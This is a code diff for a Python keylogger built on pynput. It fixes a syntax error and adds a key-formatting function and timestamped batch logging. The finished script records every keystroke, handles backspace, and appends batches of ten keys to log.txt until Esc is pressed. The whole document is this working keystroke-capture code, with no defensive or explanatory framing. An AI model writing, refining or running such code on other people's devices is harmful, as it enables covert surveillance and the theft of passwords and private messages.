@@ -1,46 +1,47 @@
-import pynput
-
 from pynput.keyboard import Key, Listener
+from datetime import datetime
 
 count = 0
 keys = []
 
 def on_press(key):
-
+    global keys, count
     if key == Key.backspace:
         if keys:
             keys.pop()
         return
 
-
-    global keys, count
     keys.append(key)
     count += 1
     print(f"{key} pressed")
 
-
-
-
-
-    if count >=10:
-        count  = 0
+    if count >= 10:
+        count = 0
         write_file(keys)
         keys = []
 
 def format_key(key):
-    if hasattr(key, 'char')
+    if hasattr(key, 'char'):
+        return key.char  # for normal keys
+    elif key == Key.space:
+        return " "
+    elif key == Key.tab:
+        return "\t"
+    elif key == Key.enter:
+        return "\n"
+    else:
+        return f"[{key.name}]" if hasattr(key, 'name') else f"[{key}]"
 
-def write_file(keys):
+def write_file(keys, job_id="", delimiter=" "):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with open("log.txt", "a") as f:
-        for key in keys:
-            k= str(key).replace("'","")
-            if k.find("space") > 0:
-                f.write('\n')
-            elif k.find("Key") == - 1:
-                f.write(k)
+        formatted_keys = delimiter.join(format_key(k) for k in keys)
+        log_line = f"[{timestamp}] {job_id}:{formatted_keys}\n"
+        f.write(log_line)
 
 def on_release(key):
     if key == Key.esc:
         return False
-with Listener(on_press = on_press, on_release = on_release) as listener:
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
